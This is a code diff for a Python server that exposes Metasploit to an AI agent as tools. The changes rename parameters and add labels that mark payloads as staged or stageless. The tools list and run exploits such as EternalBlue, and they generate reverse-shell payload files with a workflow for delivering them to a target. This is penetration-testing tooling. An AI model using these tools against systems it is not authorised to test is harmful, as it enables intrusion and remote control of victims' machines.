@@ -314,6 +314,19 @@ async def _get_session_object_from_map(
         raise
 
 
+def _classify_payload_stage(payload_name: str) -> str:
+    """Classify payload name as staged, stageless, or unknown from naming convention."""
+    normalized = payload_name
+    if normalized.startswith("payload/"):
+        normalized = normalized[8:]
+    leaf = normalized.split("/")[-1]
+    if "/" in normalized and "_" not in leaf:
+        return "staged"
+    if "_" in leaf and ("meterpreter_" in leaf or "shell_" in leaf):
+        return "stageless"
+    return "unknown"
+
+
 # Metasploit Connection Config (from environment variables)
 MSF_PASSWORD = os.getenv('MSF_PASSWORD', 'msf')
 MSF_SERVER = os.getenv('MSF_SERVER', '127.0.0.1')
@@ -1741,7 +1754,7 @@ async def _execute_module_rpc(
                      arch_hint = " (Note: x64 is 64-bit. Try x86 for 32-bit targets.)"
              
              error_msg = f"Invalid payload specified: {payload_name_for_log or 'None'}{arch_hint}. "
-             error_msg += f"To view ONLY compatible payloads for this exploit, use: list_payloads(exploit_module='{module_name}')."
+             error_msg += f"To view ONLY compatible payloads for this exploit, use: list_payloads(compatible_with='{module_name}')."
              error_msg += f" Original error: {e}"
              return {"status": "error", "message": error_msg}
         return {"status": "error", "message": f"Error running {full_module_path}: {e}"}
@@ -1862,7 +1875,7 @@ async def _execute_module_console(
                             if parts[0] != 'exploit':
                                 base_module_name = module_name
                         error_msg += f"\n{arch_hint}" if arch_hint else ""
-                        error_msg += f"\nTo view ONLY compatible payloads for this exploit, use: list_payloads(exploit_module='{base_module_name}')"
+                        error_msg += f"\nTo view ONLY compatible payloads for this exploit, use: list_payloads(compatible_with='{base_module_name}')"
                     
                     logger.error(error_msg)
                     return {"status": "error", "message": error_msg, "module": full_module_path}
@@ -1973,7 +1986,7 @@ async def _execute_module_console(
                          parts = module_name.split('/')
                          if parts[0] != 'exploit':
                              base_module_name = module_name
-                     message += f"\n\nThe failure may be payload-related. To view compatible payloads for this exploit, use: list_payloads(exploit_module='{base_module_name}')"
+                     message += f"\n\nThe failure may be payload-related. To view compatible payloads for this exploit, use: list_payloads(compatible_with='{base_module_name}')"
 
 
             return {
@@ -2001,7 +2014,7 @@ async def _execute_module_console(
 
 @mcp.tool()
 async def describe_module(
-    module_name: str,
+    module: str,
     module_type: str = "exploit"
 ) -> Dict[str, Any]:
     """
@@ -2017,7 +2030,7 @@ async def describe_module(
     3. Call run_exploit/run_auxiliary_module/run_post_module with correct options
     
     Args:
-        module_name: Module path (e.g., 'windows/smb/ms17_010_eternalblue' or 
+        module: Module path (e.g., 'windows/smb/ms17_010_eternalblue' or 
                     'exploit/windows/smb/ms17_010_eternalblue')
         module_type: Type of module - 'exploit', 'auxiliary', 'post', or 'payload'
                     (default: 'exploit')
@@ -2045,14 +2058,14 @@ async def describe_module(
         - privileged: Whether it requires privileged access
         - disclosure_date: When the vulnerability was disclosed
     """
-    logger.info(f"describe_module called with module_name='{module_name}', module_type='{module_type}'")
+    logger.info(f"describe_module called with module='{module}', module_type='{module_type}'")
     
     # Normalize module name - strip type prefix if provided to avoid double-prefix issues
     # e.g., if called with module_name="exploit/unix/ftp/foo" and module_type="exploit",
     # we should use "unix/ftp/foo" as base_module_name, not "exploit/unix/ftp/foo"
-    base_module_name = module_name
-    if '/' in module_name:
-        parts = module_name.split('/')
+    base_module_name = module
+    if '/' in module:
+        parts = module.split('/')
         if parts[0] in ('exploit', 'payload', 'post', 'auxiliary', 'encoder', 'nop'):
             # User provided full path, extract base name and potentially correct type
             if parts[0] != module_type:
@@ -2208,7 +2221,7 @@ async def describe_module(
 
 
 @mcp.tool()
-async def get_module_documentation(module_name: str) -> Dict[str, Any]:
+async def get_module_documentation(module: str) -> Dict[str, Any]:
     """
     Retrieve detailed usage documentation for a Metasploit module.
     
@@ -2222,7 +2235,7 @@ async def get_module_documentation(module_name: str) -> Dict[str, Any]:
     3. Call run_exploit/run_auxiliary_module/run_post_module with correct options
     
     Args:
-        module_name: Full or partial module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue'
+        module: Full or partial module path (e.g., 'exploit/windows/smb/ms17_010_eternalblue'
                     or 'windows/smb/ms17_010_eternalblue')
     
     Returns:
@@ -2232,7 +2245,7 @@ async def get_module_documentation(module_name: str) -> Dict[str, Any]:
         - suggestions: Alternative module documentation paths if exact match not found
         - message: Informational or error message
     """
-    logger.info(f"get_module_documentation called for '{module_name}'")
+    logger.info(f"get_module_documentation called for '{module}'")
     
     # Check if documentation directory exists
     docs_path = pathlib.Path(MSF_DOCS_PATH)
@@ -2249,7 +2262,7 @@ async def get_module_documentation(module_name: str) -> Dict[str, Any]:
     # Normalize module path - handle various input formats
     # e.g., "exploit/windows/smb/ms17_010_eternalblue" -> "exploit/windows/smb/ms17_010_eternalblue"
     # e.g., "windows/smb/ms17_010_eternalblue" -> try to find it in any type folder
-    normalized_name = module_name.strip().strip('/')
+    normalized_name = module.strip().strip('/')
     
     # Check if type prefix is present
     type_prefixes = ['exploit', 'auxiliary', 'post', 'payload', 'encoder', 'nop']
@@ -2277,7 +2290,7 @@ async def get_module_documentation(module_name: str) -> Dict[str, Any]:
                     "status": "success",
                     "documentation": content,
                     "path": str(doc_file.relative_to(docs_path)),
-                    "message": f"Documentation found for {module_name}"
+                    "message": f"Documentation found for {module}"
                 }
             except Exception as e:
                 logger.error(f"Error reading documentation file {doc_file}: {e}")
@@ -2288,7 +2301,7 @@ async def get_module_documentation(module_name: str) -> Dict[str, Any]:
                 }
     
     # Documentation not found - try to find similar documentation files
-    logger.info(f"Documentation not found for {module_name}, searching for alternatives...")
+    logger.info(f"Documentation not found for {module}, searching for alternatives...")
     suggestions = await _find_similar_documentation_files(docs_path, normalized_name)
     
     suggestion_text = ""
@@ -2297,7 +2310,7 @@ async def get_module_documentation(module_name: str) -> Dict[str, Any]:
     
     return {
         "status": "not_found",
-        "message": f"No documentation found for '{module_name}'. "
+        "message": f"No documentation found for '{module}'. "
                   f"Note: Not all modules have documentation. "
                   f"Use describe_module() for live module information from Metasploit RPC.",
         "suggestions": suggestions[:5] if suggestions else [],
@@ -2360,19 +2373,19 @@ async def _find_similar_documentation_files(docs_path: pathlib.Path, module_name
 
 
 @mcp.tool()
-async def list_exploits(search_term: str = "", ctx: Optional[Context] = None) -> List[str]:
+async def list_exploits(search: str = "", ctx: Optional[Context] = None) -> List[str]:
     """
     List available Metasploit exploits, optionally filtered by search term.
 
     Args:
-        search_term: Optional term to filter exploits (case-insensitive).
+        search: Optional term to filter exploits (case-insensitive).
         ctx: MCP Context for progress reporting (optional, injected by FastMCP).
 
     Returns:
         List of exploit names matching the term (max 200), or top 100 if no term.
     """
     client = get_msf_client()
-    logger.info(f"Listing exploits (search term: '{search_term or 'None'}')")
+    logger.info(f"Listing exploits (search term: '{search or 'None'}')")
     
     # Report initial progress if ctx available
     if ctx:
@@ -2400,12 +2413,12 @@ async def list_exploits(search_term: str = "", ctx: Optional[Context] = None) ->
             timeout=RPC_CALL_TIMEOUT
         )
         logger.debug(f"Retrieved {len(exploits)} total exploits from MSF.")
-        if search_term:
-            term_lower = search_term.lower()
+        if search:
+            term_lower = search.lower()
             filtered_exploits = [e for e in exploits if term_lower in e.lower()]
             count = len(filtered_exploits)
             limit = 200
-            logger.info(f"Found {count} exploits matching '{search_term}'. Returning max {limit}.")
+            logger.info(f"Found {count} exploits matching '{search}'. Returning max {limit}.")
             
             # Report completion if ctx available
             if ctx:
@@ -2443,26 +2456,27 @@ async def list_exploits(search_term: str = "", ctx: Optional[Context] = None) ->
         await keepalive.stop(send_completion=False)
 
 @mcp.tool()
-async def list_payloads(platform: str = "", arch: str = "", exploit_module: str = "", search_term: str = "", include_fetch_payloads: bool = False, ctx: Optional[Context] = None) -> List[str]:
+async def list_payloads(platform: str = "", arch: str = "", compatible_with: str = "", search: str = "", include_fetch_payloads: bool = False, stage_hint: bool = True, ctx: Optional[Context] = None) -> List[str]:
     """
     List available Metasploit payloads, optionally filtered by platform, architecture, exploit module compatibility, and/or search term.
     
-    IMPORTANT: For best results, use exploit_module parameter to get ONLY compatible payloads for a specific exploit.
-    Using platform/search_term alone returns ALL payloads, which may include incompatible architectures (x86 vs x64).
+    IMPORTANT: For best results, use compatible_with parameter to get ONLY compatible payloads for a specific exploit.
+    Using platform/search alone returns ALL payloads, which may include incompatible architectures (x86 vs x64).
 
     Args:
         platform: Optional platform filter (e.g., 'windows', 'linux', 'python', 'php').
                  Returns all payloads for that platform regardless of compatibility.
         arch: Optional architecture filter (e.g., 'x86', 'x64', 'cmd', 'meterpreter').
              Filters by architecture, but doesn't guarantee exploit compatibility.
-        exploit_module: Optional exploit module name to list ONLY compatible payloads (e.g., 'windows/smb/ms17_010_eternalblue').
+        compatible_with: Optional exploit module name to list ONLY compatible payloads (e.g., 'windows/smb/ms17_010_eternalblue').
                        RECOMMENDED: Use this to get payloads guaranteed to work with the exploit.
                        Returns only payloads with correct architecture and compatibility for the target.
-        search_term: Optional search term to filter payloads by name (e.g., 'meterpreter', 'reverse_tcp').
+        search: Optional search term to filter payloads by name (e.g., 'meterpreter', 'reverse_tcp').
                     Supports partial matches and wildcards (*). Case-insensitive.
                     Returns matching payloads regardless of compatibility.
         include_fetch_payloads: If True, includes Fetch Payloads (cmd/*) in results. These require run_as_job=False to use.
                                Default is False as they need console execution.
+        stage_hint: If True, append [staged]/[stageless] hints when detectable by naming pattern.
         ctx: MCP Context for progress reporting (optional, injected by FastMCP).
 
     Returns:
@@ -2474,7 +2488,7 @@ async def list_payloads(platform: str = "", arch: str = "", exploit_module: str 
               You can use payloads with or without the 'payload/' prefix in run_exploit() - it will be normalized automatically.
     """
     client = get_msf_client()
-    logger.info(f"Listing payloads (platform: '{platform or 'Any'}', arch: '{arch or 'Any'}', exploit: '{exploit_module or 'Any'}', search: '{search_term or 'Any'}')")
+    logger.info(f"Listing payloads (platform: '{platform or 'Any'}', arch: '{arch or 'Any'}', exploit: '{compatible_with or 'Any'}', search: '{search or 'Any'}')")
     
     # Report initial progress if ctx available
     if ctx:
@@ -2495,29 +2509,29 @@ async def list_payloads(platform: str = "", arch: str = "", exploit_module: str 
     try:
         await keepalive.start()
         
-        # If exploit_module is provided, get compatible payloads for that module
-        if exploit_module:
-            logger.info(f"Getting compatible payloads for exploit module: {exploit_module}")
+        # If compatible_with is provided, get compatible payloads for that module
+        if compatible_with:
+            logger.info(f"Getting compatible payloads for exploit module: {compatible_with}")
             try:
                 # Get the module object
-                module_obj = await _get_module_object('exploit', exploit_module)
+                module_obj = await _get_module_object('exploit', compatible_with)
                 
                 # Get compatible payloads using MSF RPC API
                 # The module.compatible_payloads method returns payloads compatible with the exploit
-                logger.debug(f"Calling module.payloads for {exploit_module} with {RPC_CALL_TIMEOUT}s timeout...")
+                logger.debug(f"Calling module.payloads for {compatible_with} with {RPC_CALL_TIMEOUT}s timeout...")
                 compatible = await asyncio.wait_for(
                     asyncio.to_thread(lambda: module_obj.payloads),
                     timeout=RPC_CALL_TIMEOUT
                 )
-                logger.debug(f"Retrieved {len(compatible)} compatible payloads for {exploit_module}.")
+                logger.debug(f"Retrieved {len(compatible)} compatible payloads for {compatible_with}.")
                 
                 # compatible_payloads returns a list of payload names
                 filtered = compatible
                 
             except (ValueError, InvalidModuleError) as ve:
                 # Module not found
-                logger.warning(f"Exploit module '{exploit_module}' not found: {ve}")
-                return [f"Error: Exploit module '{exploit_module}' not found. Please verify the module name using list_exploits."]
+                logger.warning(f"Exploit module '{compatible_with}' not found: {ve}")
+                return [f"Error: Exploit module '{compatible_with}' not found. Please verify the module name using list_exploits."]
         else:
             # Add timeout to prevent hanging on slow/unresponsive MSF server
             logger.debug(f"Calling client.modules.payloads with {RPC_CALL_TIMEOUT}s timeout...")
@@ -2589,9 +2603,9 @@ async def list_payloads(platform: str = "", arch: str = "", exploit_module: str 
             filtered = filtered_arch_specific + non_arch_payloads
             logger.debug(f"Arch filter '{arch}': {len(filtered_arch_specific)} arch-specific matching payloads + {len(non_arch_payloads)} non-arch-specific payloads = {len(filtered)} total")
         
-        # Apply search_term filter if provided
-        if search_term:
-            search_lower = search_term.lower()
+        # Apply search filter if provided
+        if search:
+            search_lower = search.lower()
             # Support wildcards by converting * to .* for regex matching
             if '*' in search_lower:
                 pattern = re.compile(search_lower.replace('*', '.*'))
@@ -2607,6 +2621,17 @@ async def list_payloads(platform: str = "", arch: str = "", exploit_module: str 
         logger.info(f"Found {count} payloads matching filters. Returning max {limit}.")
         
         result = payloads[:limit]
+        if stage_hint:
+            hinted = []
+            for payload_name in result:
+                stage = _classify_payload_stage(payload_name)
+                if stage == "staged":
+                    hinted.append(f"{payload_name} [staged]")
+                elif stage == "stageless":
+                    hinted.append(f"{payload_name} [stageless]")
+                else:
+                    hinted.append(payload_name)
+            result = hinted
         
         # Report completion if ctx available
         if ctx:
@@ -2632,19 +2657,19 @@ async def list_payloads(platform: str = "", arch: str = "", exploit_module: str 
 
 @mcp.tool()
 async def generate_payload(
-    payload_type: str,
-    format_type: str,
+    payload: str,
+    format: str,
     options: Union[Dict[str, Any], str], # Required: e.g., {"LHOST": "1.2.3.4", "LPORT": 4444} or "LHOST=1.2.3.4,LPORT=4444"
     encoder: Optional[str] = None,
     iterations: int = 0,
-    bad_chars: str = "",
-    nop_sled_size: int = 0,
-    template_path: Optional[str] = None,
+    badchars: str = "",
+    nops: int = 0,
+    template: Optional[str] = None,
     keep_template: bool = False,
     force_encode: bool = False,
-    output_filename: Optional[str] = None,
-    reverse_listener_bind_address: Optional[str] = None,
-    reverse_listener_bind_port: Optional[int] = None,
+    output: Optional[str] = None,
+    reverselistenerbindaddress: Optional[str] = None,
+    reverselistenerbindport: Optional[int] = None,
     ctx: Optional[Context] = None,
 ) -> Dict[str, Any]:
     """
@@ -2657,15 +2682,15 @@ async def generate_payload(
     
     WORKFLOW:
     1. Call generate_payload() to create the payload file (e.g., .exe, .elf, .py)
-    2. Call start_listener() with matching payload_type, LHOST, and LPORT
+    2. Call start_listener() with matching payload, LHOST, and LPORT
     3. Distribute/execute the generated payload file on the target
     4. The target will connect back to your listener and establish a session
     
     EXAMPLE - CORRECT USAGE:
         # Step 1: Generate payload
         result = await generate_payload(
-            payload_type='windows/meterpreter/reverse_tcp',
-            format_type='exe',
+            payload='windows/meterpreter/reverse_tcp',
+            format='exe',
             options={'LHOST': '10.0.0.1', 'LPORT': 4444}
         )
         # Step 2: Start matching listener
@@ -2677,35 +2702,35 @@ async def generate_payload(
     standalone payload files for manual delivery.
 
     Args:
-        payload_type: Type of payload (e.g., windows/meterpreter/reverse_tcp).
-        format_type: Output format (raw, exe, python, etc.).
+        payload: Type of payload (e.g., windows/meterpreter/reverse_tcp).
+        format: Output format (raw, exe, python, etc.).
         options: Dictionary of required payload options (e.g., {"LHOST": "1.2.3.4", "LPORT": 4444})
                 or string format "LHOST=1.2.3.4,LPORT=4444". Prefer dict format.
         encoder: Optional encoder to use.
         iterations: Optional number of encoding iterations.
-        bad_chars: Optional string of bad characters to avoid (e.g., '\\x00\\x0a\\x0d').
-        nop_sled_size: Optional size of NOP sled.
-        template_path: Optional path to an executable template.
-        keep_template: Keep the template working (requires template_path).
+        badchars: Optional string of bad characters to avoid (e.g., '\\x00\\x0a\\x0d').
+        nops: Optional size of NOP sled.
+        template: Optional path to an executable template.
+        keep_template: Keep the template working (requires template).
         force_encode: Force encoding even if not needed by bad chars.
-        output_filename: Optional desired filename (without path). If None, a default name is generated.
-        reverse_listener_bind_address: Optional bind address for reverse payloads (defaults to 0.0.0.0).
+        output: Optional desired filename (without path). If None, a default name is generated.
+        reverselistenerbindaddress: Optional bind address for reverse payloads (defaults to 0.0.0.0).
                                       Use this when LHOST differs from the interface to bind to (e.g., NAT/firewall).
-        reverse_listener_bind_port: Optional bind port for reverse payloads (defaults to LPORT).
+        reverselistenerbindport: Optional bind port for reverse payloads (defaults to LPORT).
                                    Use this when LPORT differs from the port to bind to (e.g., port forwarding).
 
     Returns:
         Dictionary containing status, message, payload size/info, and server-side save path.
     """
     client = get_msf_client()
-    logger.info(f"Generating payload '{payload_type}' (Format: {format_type}) via RPC. Options: {options}")
+    logger.info(f"Generating payload '{payload}' (Format: {format}) via RPC. Options: {options}")
     
     # Report initial progress if ctx available
     if ctx:
         await ctx.report_progress(
             progress=0,
             total=100,
-            message=f"Generating payload: {payload_type}"
+            message=f"Generating payload: {payload}"
         )
 
     # Parse options gracefully
@@ -2719,9 +2744,9 @@ async def generate_payload(
 
     # Handle bind address and port options
     bind_address_to_validate = None
-    if reverse_listener_bind_address is not None:
-        bind_address_to_validate = reverse_listener_bind_address
-        parsed_options['ReverseListenerBindAddress'] = reverse_listener_bind_address
+    if reverselistenerbindaddress is not None:
+        bind_address_to_validate = reverselistenerbindaddress
+        parsed_options['ReverseListenerBindAddress'] = reverselistenerbindaddress
     elif 'LHOST' in parsed_options:
         # Default to 0.0.0.0 instead of using LHOST
         bind_address_to_validate = "0.0.0.0"
@@ -2733,10 +2758,10 @@ async def generate_payload(
         if not is_valid:
             return {"status": "error", "message": f"Invalid ReverseListenerBindAddress: {error_msg}"}
     
-    if reverse_listener_bind_port is not None:
-        if not (1 <= reverse_listener_bind_port <= 65535):
+    if reverselistenerbindport is not None:
+        if not (1 <= reverselistenerbindport <= 65535):
             return {"status": "error", "message": "Invalid ReverseListenerBindPort. Must be between 1 and 65535."}
-        parsed_options['ReverseListenerBindPort'] = reverse_listener_bind_port
+        parsed_options['ReverseListenerBindPort'] = reverselistenerbindport
     
     # Check LPORT availability if it's a reverse payload (optional warning for payload generation)
     # This provides early feedback even though the actual bind happens when the payload runs/listener starts
@@ -2761,7 +2786,7 @@ async def generate_payload(
     # Use keep-alive for payload generation
     keepalive = get_keepalive_manager(
         ctx,
-        operation_name=f"Generate payload {payload_type}",
+        operation_name=f"Generate payload {payload}",
         initial_progress=10,
         max_progress=90
     )
@@ -2770,10 +2795,10 @@ async def generate_payload(
         await keepalive.start()
         
         # Get the payload module object
-        payload = await _get_module_object('payload', payload_type)
+        payload_obj = await _get_module_object('payload', payload)
 
         # Set payload-specific required options (like LHOST/LPORT)
-        await _set_module_options(payload, parsed_options, module_type='payload')
+        await _set_module_options(payload_obj, parsed_options, module_type='payload')
 
         # Set payload generation options in payload.runoptions
         # as per the pymetasploit3 documentation
@@ -2783,21 +2808,21 @@ async def generate_payload(
         async def update_runoption(key, value):
             if value is None:
                 return
-            await asyncio.to_thread(lambda k=key, v=value: payload.runoptions.__setitem__(k, v))
+            await asyncio.to_thread(lambda k=key, v=value: payload_obj.runoptions.__setitem__(k, v))
             logger.debug(f"Set runoption {key}={value}")
         
         # Set generation options individually
-        await update_runoption('Format', format_type)
+        await update_runoption('Format', format)
         if encoder:
             await update_runoption('Encoder', encoder)
         if iterations:
             await update_runoption('Iterations', iterations) 
-        if bad_chars is not None:
-            await update_runoption('BadChars', bad_chars)
-        if nop_sled_size:
-            await update_runoption('NopSledSize', nop_sled_size)
-        if template_path:
-            await update_runoption('Template', template_path)
+        if badchars is not None:
+            await update_runoption('BadChars', badchars)
+        if nops:
+            await update_runoption('NopSledSize', nops)
+        if template:
+            await update_runoption('Template', template)
         if keep_template:
             await update_runoption('KeepTemplateWorking', keep_template)
         if force_encode:
@@ -2805,7 +2830,7 @@ async def generate_payload(
         
         # Generate the payload bytes using payload.payload_generate()
         logger.info("Calling payload.payload_generate()...")
-        raw_payload_bytes = await asyncio.to_thread(lambda: payload.payload_generate())
+        raw_payload_bytes = await asyncio.to_thread(lambda: payload_obj.payload_generate())
 
         if not isinstance(raw_payload_bytes, bytes):
             error_msg = f"Payload generation failed. Expected bytes, got {type(raw_payload_bytes)}: {str(raw_payload_bytes)[:200]}"
@@ -2828,20 +2853,20 @@ async def generate_payload(
             return {
                 "status": "error",
                 "message": f"Payload generated ({payload_size} bytes) but could not create save directory: {e}",
-                "payload_size": payload_size, "format": format_type
+                "payload_size": payload_size, "format": format
             }
 
         # Determine filename (with basic sanitization)
         final_filename = None
-        if output_filename:
-            sanitized = re.sub(r'[^a-zA-Z0-9_.\-]', '_', os.path.basename(output_filename)) # Basic sanitize + basename
+        if output:
+            sanitized = re.sub(r'[^a-zA-Z0-9_.\-]', '_', os.path.basename(output)) # Basic sanitize + basename
             if sanitized: final_filename = sanitized
 
         if not final_filename:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            safe_payload_type = re.sub(r'[^a-zA-Z0-9_]', '_', payload_type)
-            safe_format = re.sub(r'[^a-zA-Z0-9_]', '_', format_type)
-            final_filename = f"payload_{safe_payload_type}_{timestamp}.{safe_format}"
+            safe_payload = re.sub(r'[^a-zA-Z0-9_]', '_', payload)
+            safe_format = re.sub(r'[^a-zA-Z0-9_]', '_', format)
+            final_filename = f"payload_{safe_payload}_{timestamp}.{safe_format}"
 
         save_path = os.path.join(PAYLOAD_SAVE_DIR, final_filename)
 
@@ -2861,9 +2886,9 @@ async def generate_payload(
             
             return {
                 "status": "success",
-                "message": f"Payload '{payload_type}' generated successfully and saved.",
+                "message": f"Payload '{payload}' generated successfully and saved.",
                 "payload_size": payload_size,
-                "format": format_type,
+                "format": format,
                 "server_save_path": save_path
             }
         except IOError as e:
@@ -2871,24 +2896,24 @@ async def generate_payload(
             return {
                 "status": "error",
                 "message": f"Payload generated but failed to save to file: {e}",
-                "payload_size": payload_size, "format": format_type
+                "payload_size": payload_size, "format": format
             }
 
     except InvalidModuleError as e:
         # Clean warning for invalid payload module (not a bug, just wrong module name)
-        logger.warning(f"Payload type '{payload_type}' not found: {e}")
-        return {"status": "error", "message": f"Invalid payload type: {payload_type}. Verify the payload name is correct and available in your Metasploit installation."}
+        logger.warning(f"Payload type '{payload}' not found: {e}")
+        return {"status": "error", "message": f"Invalid payload type: {payload}. Verify the payload name is correct and available in your Metasploit installation."}
     except (ValueError, MsfRpcError) as e: # Catches errors from _get_module_object, _set_module_options
         error_str = str(e).lower()
-        logger.error(f"Error generating payload {payload_type}: {e}")
+        logger.error(f"Error generating payload {payload}: {e}")
         if "invalid payload type" in error_str or "unknown module" in error_str:
-             return {"status": "error", "message": f"Invalid payload type: {payload_type}"}
+             return {"status": "error", "message": f"Invalid payload type: {payload}"}
         elif "missing required option" in error_str or "invalid option" in error_str:
-             missing = getattr(payload, 'missing_required', []) if 'payload' in locals() else []
-             return {"status": "error", "message": f"Missing/invalid options for payload {payload_type}: {e}", "missing_required": missing}
+             missing = getattr(payload_obj, 'missing_required', []) if 'payload_obj' in locals() else []
+             return {"status": "error", "message": f"Missing/invalid options for payload {payload}: {e}", "missing_required": missing}
         return {"status": "error", "message": f"Error generating payload: {e}"}
     except AttributeError as e: # Specifically catch if payload_generate is missing
-        logger.exception(f"AttributeError during payload generation for '{payload_type}': {e}")
+        logger.exception(f"AttributeError during payload generation for '{payload}': {e}")
         if "object has no attribute 'payload_generate'" in str(e):
             return {"status": "error", "message": f"The pymetasploit3 payload module doesn't have the payload_generate method. Please check library version/compatibility."}
         return {"status": "error", "message": f"An attribute error occurred: {e}"}
@@ -2897,7 +2922,7 @@ async def generate_payload(
         # an error response without a 'payload' key (e.g., missing options, invalid format)
         error_str = str(e)
         logger.error(
-            f"KeyError during payload generation for '{payload_type}' (format: {format_type}): {e}. "
+            f"KeyError during payload generation for '{payload}' (format: {format}): {e}. "
             f"This typically indicates the Metasploit RPC server rejected the payload generation request. "
             f"Options provided: {parsed_options}",
             exc_info=True
@@ -2909,7 +2934,7 @@ async def generate_payload(
             guidance_messages.append(
                 f"The Metasploit RPC server did not return generated payload data. "
                 f"Common causes: (1) Missing required options (check LHOST, LPORT for reverse payloads), "
-                f"(2) Incompatible format '{format_type}' for payload '{payload_type}' "
+                f"(2) Incompatible format '{format}' for payload '{payload}' "
                 f"(try 'raw', 'elf', 'exe', 'war', 'jar', or 'jsp' depending on payload type), "
                 f"(3) The payload module may have specific requirements not met."
             )
@@ -2917,8 +2942,8 @@ async def generate_payload(
         # Check if payload module has info about required options
         missing_required = []
         try:
-            if 'payload' in locals() and hasattr(payload, 'missing_required'):
-                missing_required = payload.missing_required
+            if 'payload_obj' in locals() and hasattr(payload_obj, 'missing_required'):
+                missing_required = payload_obj.missing_required
                 if missing_required:
                     guidance_messages.append(f"Missing required options: {missing_required}")
         except Exception:
@@ -2927,27 +2952,27 @@ async def generate_payload(
         return {
             "status": "error",
             "message": (
-                f"Payload generation failed for '{payload_type}' with format '{format_type}'. "
+                f"Payload generation failed for '{payload}' with format '{format}'. "
                 + " ".join(guidance_messages) if guidance_messages else
-                f"Payload generation failed for '{payload_type}' with format '{format_type}'. "
+                f"Payload generation failed for '{payload}' with format '{format}'. "
                 f"The Metasploit server did not return the expected payload data. "
                 f"Verify that the payload type, format, and options are valid and compatible."
             ),
-            "payload_type": payload_type,
-            "format": format_type,
+            "payload": payload,
+            "format": format,
             "missing_required": missing_required if missing_required else None
         }
     except Exception as e:
-        logger.exception(f"Unexpected error during payload generation for '{payload_type}'.")
+        logger.exception(f"Unexpected error during payload generation for '{payload}'.")
         return {"status": "error", "message": f"An unexpected server error occurred during payload generation: {e}"}
     finally:
         await keepalive.stop(send_completion=False)
 
 @mcp.tool()
 async def run_exploit(
-    module_name: str,
+    module: str,
     options: Union[Dict[str, Any], str],
-    payload_name: Optional[str] = None,
+    payload: Optional[str] = None,
     payload_options: Optional[Union[Dict[str, Any], str]] = None,
     run_as_job: bool = True,
     check_vulnerability: bool = False, # New option
@@ -2960,7 +2985,7 @@ async def run_exploit(
     
     IMPORTANT - LISTENER HANDLING:
     This function AUTOMATICALLY sets up the necessary listener/handler when you provide
-    a payload_name and payload_options. DO NOT call start_listener() separately for the
+    a payload and payload_options. DO NOT call start_listener() separately for the
     same payload/port combination - this will cause port conflicts and failures.
     
     WHEN TO USE start_listener() vs run_exploit():
@@ -2974,9 +2999,9 @@ async def run_exploit(
     
     EXAMPLE - CORRECT USAGE (run_exploit handles listener):
         await run_exploit(
-            module_name='exploit/multi/handler',
+            module='exploit/multi/handler',
             options={},
-            payload_name='windows/meterpreter/reverse_tcp',
+            payload='windows/meterpreter/reverse_tcp',
             payload_options={'LHOST': '10.0.0.1', 'LPORT': 4444}
         )
         # No need to call start_listener() - it's automatic!
@@ -2986,10 +3011,10 @@ async def run_exploit(
         await run_exploit(..., payload_options={'LHOST': '10.0.0.1', 'LPORT': 4444})  # FAILS - port already in use!
 
     Args:
-        module_name: Name/path of the exploit module (e.g., 'unix/ftp/vsftpd_234_backdoor').
+        module: Name/path of the exploit module (e.g., 'unix/ftp/vsftpd_234_backdoor').
         options: Dictionary of exploit module options (e.g., {'RHOSTS': '192.168.1.1'})
                 or string format "RHOSTS=192.168.1.1,RPORT=21". Prefer dict format.
-        payload_name: Name of the payload (e.g., 'linux/x86/meterpreter/reverse_tcp').
+        payload: Name of the payload (e.g., 'linux/x86/meterpreter/reverse_tcp').
                      When specified, this function AUTOMATICALLY creates the handler/listener.
         payload_options: Dictionary of payload options (e.g., {'LHOST': '...', 'LPORT': ...})
                         or string format "LHOST=1.2.3.4,LPORT=4444". Prefer dict format.
@@ -3006,21 +3031,21 @@ async def run_exploit(
         logger.warning(f"timeout_seconds {timeout_seconds}s exceeds max {MAX_TOOL_TIMEOUT_SECONDS}s, capping to {MAX_TOOL_TIMEOUT_SECONDS}s")
         timeout_seconds = MAX_TOOL_TIMEOUT_SECONDS
     
-    logger.info(f"Request to run exploit '{module_name}'. Job: {run_as_job}, Check: {check_vulnerability}, Payload: {payload_name}")
+    logger.info(f"Request to run exploit '{module}'. Job: {run_as_job}, Check: {check_vulnerability}, Payload: {payload}")
 
-    logger.info(f"Module {module_name} options: {options}")
-    logger.info(f"Payload {payload_name} options: {payload_options}")
+    logger.info(f"Module {module} options: {options}")
+    logger.info(f"Payload {payload} options: {payload_options}")
     
     # Validate module exists before proceeding
     try:
-        await _get_module_object('exploit', module_name)
-        logger.debug(f"Module '{module_name}' validated successfully")
+        await _get_module_object('exploit', module)
+        logger.debug(f"Module '{module}' validated successfully")
     except InvalidModuleError as e:
-        logger.warning(f"Exploit module '{module_name}' not found: {e}")
+        logger.warning(f"Exploit module '{module}' not found: {e}")
         return {"status": "error", "message": str(e)}
     except Exception as e:
-        logger.error(f"Error validating module '{module_name}': {e}")
-        return {"status": "error", "message": f"Error validating module '{module_name}': {e}"}
+        logger.error(f"Error validating module '{module}': {e}")
+        return {"status": "error", "message": f"Error validating module '{module}': {e}"}
     
     # Parse options gracefully (handles both dict and string formats)
     try:
@@ -3035,14 +3060,14 @@ async def run_exploit(
         return {"status": "error", "message": f"Invalid payload_options format: {e}"}
 
     payload_spec = None
-    if payload_name:
+    if payload:
         # Normalize payload name format - strip 'payload/' prefix if present for internal use
         # But detect Fetch Payloads and guide user
-        normalized_payload = payload_name
-        if payload_name.startswith('payload/'):
+        normalized_payload = payload
+        if payload.startswith('payload/'):
             # Strip payload/ prefix for internal processing
-            normalized_payload = payload_name[8:]
-            logger.debug(f"Normalized payload name: '{payload_name}' -> '{normalized_payload}'")
+            normalized_payload = payload[8:]
+            logger.debug(f"Normalized payload name: '{payload}' -> '{normalized_payload}'")
         
         # Detect Fetch Payloads (cmd/) and guide user to console execution
         # if normalized_payload.startswith('cmd/') and run_as_job:
@@ -3064,9 +3089,9 @@ async def run_exploit(
         #     }
         
         # Use normalized payload name (without payload/ prefix) for spec
-        payload_name = normalized_payload
+        payload = normalized_payload
         
-        payload_spec = {"name": payload_name, "options": parsed_payload_options}
+        payload_spec = {"name": payload, "options": parsed_payload_options}
         
         # Check if LPORT is provided and if the port is available
         if 'LPORT' in parsed_payload_options:
@@ -3086,61 +3111,81 @@ async def run_exploit(
                 return {"status": "error", "message": f"Invalid LPORT value '{lport_value}': {e}"}
 
     if check_vulnerability:
